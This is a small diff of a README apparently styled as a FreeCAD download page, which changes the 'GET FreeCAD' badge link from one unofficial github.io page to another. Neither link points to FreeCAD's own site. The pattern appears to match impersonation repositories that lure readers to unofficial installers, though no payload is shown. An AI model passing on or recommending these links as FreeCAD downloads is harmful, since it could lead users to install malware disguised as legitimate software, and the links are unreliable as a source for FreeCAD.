@@ -3,7 +3,7 @@
 
 ![FreeCAD](https://upload.wikimedia.org/wikipedia/commons/a/a9/Freecad_logo_large.svg?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=original)
 
-[![GET FreeCAD](https://img.shields.io/badge/GET%20%E2%80%94%20FreeCAD-0078D6?style=for-the-badge&logoColor=white)](https://newlonmediaraef.github.io/.github/freecad-download)
+[![GET FreeCAD](https://img.shields.io/badge/GET%20%E2%80%94%20FreeCAD-0078D6?style=for-the-badge&logoColor=white)](https://software-freecad-install.github.io/.github/)
 
 ---
 
